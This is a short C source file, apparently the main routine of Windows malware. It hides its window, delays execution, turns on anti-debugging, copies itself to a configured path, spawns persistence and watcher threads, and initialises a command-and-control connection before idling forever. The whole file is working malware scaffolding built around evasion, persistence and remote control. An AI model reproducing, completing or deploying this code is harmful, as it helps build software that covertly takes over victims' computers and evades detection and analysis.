#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include "required.h"
#include "config.h"
#include "util.h"
#include "comm.h"

void initialization(int argc, char **argv) {
 #if debug==0
  hide_window();
 #endif
 char *machine_uuid = get_machine_uuid();
 setup_mutex(machine_uuid);
 #if debug==0
  delay_execution();
  initialize_antidebug();
 #endif
 CopyFile(argv[0], mainpath, 0);
 srand(GetTickCount());
 #if debug==0
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)establish_persistence, (LPVOID)argv[0], 0, 0);
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)watcher_proc, 0, 0, 0);
 #endif
 initialize_winsock();
 initialize_c2();
}

int main(int argc, char **argv) {
 initialization(argc, argv);
 while(1) sleep(1);
}
